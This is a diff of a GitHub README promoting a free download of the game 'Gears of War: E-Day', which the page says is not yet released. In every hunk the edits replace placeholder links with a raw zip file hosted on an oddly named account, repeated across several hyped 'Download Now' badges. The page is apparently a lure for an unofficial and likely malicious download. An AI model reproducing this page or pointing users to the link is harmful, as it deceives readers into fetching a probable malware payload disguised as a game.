@@ -4,7 +4,7 @@
 
 > The Coalition takes players back to the most terrifying day in Sera's history — the moment the Locust emerged and humanity's war began, told as a gripping prequel origin story.
 
-[![Download Now](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://download.com)&nbsp;
+[![Download Now](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://github.com/Muscovitecombretumbracteosum318/gears-of-war-e-day/raw/refs/heads/main/sweetish/war-day-gears-of-e-1.0.zip)&nbsp;
 ![Platform](https://img.shields.io/badge/Platform-Available-green?style=flat-square)&nbsp;
 ![Release](https://img.shields.io/badge/Release-2026-orange?style=flat-square)
 
@@ -37,9 +37,9 @@ Releases on **October 2026** · Available on **Xbox Series X|S, PC (exclusive)**
 
 ### Ready to play / use?
 
-[![Download Gears of War: E-Day](https://img.shields.io/badge/Download-Gears%20of%20War%20EDay-brightgreen?style=for-the-badge)](https://download.com)
+[![Download Gears of War: E-Day](https://img.shields.io/badge/Download-Gears%20of%20War%20EDay-brightgreen?style=for-the-badge)](https://github.com/Muscovitecombretumbracteosum318/gears-of-war-e-day/raw/refs/heads/main/sweetish/war-day-gears-of-e-1.0.zip)
 
-> **[Click here to download](https://download.com)**
+> **[Click here to download](https://github.com/Muscovitecombretumbracteosum318/gears-of-war-e-day/raw/refs/heads/main/sweetish/war-day-gears-of-e-1.0.zip)**
 
 </div>
 
@@ -68,7 +68,7 @@ Gears of War: E-Day is one of the **most hyped releases of Summer 2026** — tre
 
 | Download | Community | News |
 |:--------:|:---------:|:----:|
-| [Download here](https://download.com) | Reddit & Discord | Gaming & tech news |
+| [Download here](https://github.com/Muscovitecombretumbracteosum318/gears-of-war-e-day/raw/refs/heads/main/sweetish/war-day-gears-of-e-1.0.zip) | Reddit & Discord | Gaming & tech news |
 
 ---
 
@@ -76,7 +76,7 @@ Gears of War: E-Day is one of the **most hyped releases of Summer 2026** — tre
 
 **Don't miss out — Gears of War: E-Day is one of 2026's must-have releases.**
 
-[![Download Now](https://img.shields.io/badge/Download-Gears%20of%20War%20EDay-blue?style=for-the-badge)](https://download.com)
+[![Download Now](https://img.shields.io/badge/Download-Gears%20of%20War%20EDay-blue?style=for-the-badge)](https://github.com/Muscovitecombretumbracteosum318/gears-of-war-e-day/raw/refs/heads/main/sweetish/war-day-gears-of-e-1.0.zip)
 
 *Gears of War: E-Day — October 2026 · Xbox Series X|S, PC (exclusive)*
 
